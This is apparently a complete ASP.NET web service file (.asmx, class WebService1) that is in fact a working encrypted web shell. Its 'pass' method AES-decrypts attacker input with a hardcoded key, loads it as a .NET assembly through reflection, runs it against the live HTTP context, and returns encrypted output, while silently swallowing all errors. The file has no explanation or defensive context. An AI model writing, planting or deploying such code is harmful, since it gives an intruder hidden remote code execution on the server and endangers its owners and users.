<%@ WebService Language="C#" Class="WebService1" %>
public class WebService1 : System.Web.Services.WebService
{

        [System.Web.Services.WebMethod(EnableSession = true)]
        public string pass(string pass)
        {
			System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
            try { string key = "3c6e0b8a9c15224a"; string pass_pass = "pass"; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass_pass + key))).Replace("-", ""); byte[] data = System.Convert.FromBase64String(System.Web.HttpUtility.UrlDecode(pass)); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Context.Session["payload"] == null) { Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); ; } else { object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY"); System.IO.MemoryStream outStream = new System.IO.MemoryStream(); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); stringBuilder.Append(md5.Substring(0, 16)); stringBuilder.Append(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); stringBuilder.Append(md5.Substring(16)); } } catch (System.Exception) { }
			return stringBuilder.ToString();
		}
    
}
